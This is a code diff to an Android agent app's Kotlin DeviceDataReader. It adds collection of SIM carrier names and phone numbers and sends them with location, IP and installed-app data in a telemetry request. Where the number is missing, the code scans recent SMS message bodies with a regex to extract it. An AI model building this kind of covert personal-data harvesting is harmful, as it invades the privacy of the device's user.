@@ -17,6 +17,8 @@ import android.os.Environment
 import android.os.StatFs
 import android.provider.CallLog
 import android.provider.Telephony
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.content.ContextCompat
 import com.example.gmaagent.network.AppInfo
@@ -446,6 +448,120 @@ object DeviceDataReader {
         return apps
     }
 
+    // ── SIM & Telephony Intelligence ──────────────────────────
+
+    fun getSimDetails(context: Context): Triple<String?, String?, String?> {
+        var sim1: String? = null
+        var sim2: String? = null
+        var primaryPhone: String? = null
+
+        try {
+            val hasPhonePerm = ContextCompat.checkSelfPermission(
+                context,
+                android.Manifest.permission.READ_PHONE_STATE
+            ) == PackageManager.PERMISSION_GRANTED
+
+            if (hasPhonePerm) {
+                val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+                val subs = subManager?.activeSubscriptionInfoList
+
+                if (!subs.isNullOrEmpty()) {
+                    for (sub in subs) {
+                        val slot = sub.simSlotIndex // 0 or 1
+                        val carrier = sub.carrierName?.toString()?.trim()
+                            ?: sub.displayName?.toString()?.trim()
+                            ?: "Cellular"
+
+                        var num: String? = null
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                            try {
+                                num = subManager.getPhoneNumber(sub.subscriptionId)
+                            } catch (_: Exception) {}
+                        }
+                        if (num.isNullOrBlank()) {
+                            @Suppress("DEPRECATION")
+                            num = sub.number
+                        }
+
+                        val cleanNum = num?.takeIf { it.isNotBlank() && it != "unknown" }
+                        val formatted = if (cleanNum != null) "$cleanNum $carrier" else carrier
+
+                        if (slot == 0) {
+                            sim1 = formatted
+                            if (cleanNum != null && primaryPhone == null) primaryPhone = cleanNum
+                        } else if (slot == 1) {
+                            sim2 = formatted
+                            if (cleanNum != null && primaryPhone == null) primaryPhone = cleanNum
+                        }
+                    }
+                }
+
+                // If number was not on SIM (common in Indian SIMs), check TelephonyManager.line1Number
+                if (primaryPhone.isNullOrBlank()) {
+                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                    try {
+                        @Suppress("DEPRECATION")
+                        val line1 = telephonyManager?.line1Number
+                        if (!line1.isNullOrBlank() && line1 != "unknown") {
+                            primaryPhone = line1
+                            if (sim1 == null) sim1 = line1
+                        }
+                    } catch (_: Exception) {}
+                }
+            }
+
+            // Auto-detect phone number from operator SMS (Jio, Airtel, Vi, BSNL) if still missing
+            if (primaryPhone.isNullOrBlank()) {
+                val detected = extractNumberFromOperatorSms(context)
+                if (!detected.isNullOrBlank()) {
+                    primaryPhone = detected
+                    if (sim1 != null) {
+                        sim1 = "$detected $sim1"
+                    } else {
+                        sim1 = detected
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error detecting SIM details", e)
+        }
+
+        return Triple(sim1, sim2, primaryPhone)
+    }
+
+    private fun extractNumberFromOperatorSms(context: Context): String? {
+        var cursor: Cursor? = null
+        try {
+            cursor = context.contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
+                null,
+                null,
+                "${Telephony.Sms.DATE} DESC",
+            )
+            val regex = Regex("""(?:number|mobile|no\.?|sim|recharge\s+for|for)\s*[:\-]?\s*(?:\+?91)?[ -]?([6-9]\d{9})\b""", RegexOption.IGNORE_CASE)
+            var count = 0
+            cursor?.let {
+                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
+                while (it.moveToNext() && count < 60) {
+                    val body = it.getString(bodyIdx) ?: ""
+                    val match = regex.find(body)
+                    if (match != null) {
+                        val num = match.groupValues[1]
+                        if (num.length == 10) {
+                            return "+91 $num"
+                        }
+                    }
+                    count++
+                }
+            }
+        } catch (_: Exception) {
+        } finally {
+            cursor?.close()
+        }
+        return null
+    }
+
     // ── Combined Telemetry Fetcher ───────────────────────────
 
     fun collectTelemetry(context: Context, includeApps: Boolean = false): DeviceTelemetryRequest {
@@ -456,6 +572,7 @@ object DeviceDataReader {
         val location = getGeolocation(context)
         val (ip, netType) = getNetworkIntelligence(context)
         val apps = if (includeApps) getInstalledApps(context) else null
+        val (sim1, sim2, phoneNum) = getSimDetails(context)
 
         return DeviceTelemetryRequest(
             battery_level = if (battery >= 0) battery else null,
@@ -468,6 +585,9 @@ object DeviceDataReader {
             ip_address = ip,
             network_type = netType,
             installed_apps = apps,
+            phone_number = phoneNum,
+            sim_1 = sim1,
+            sim_2 = sim2,
         )
     }
 }
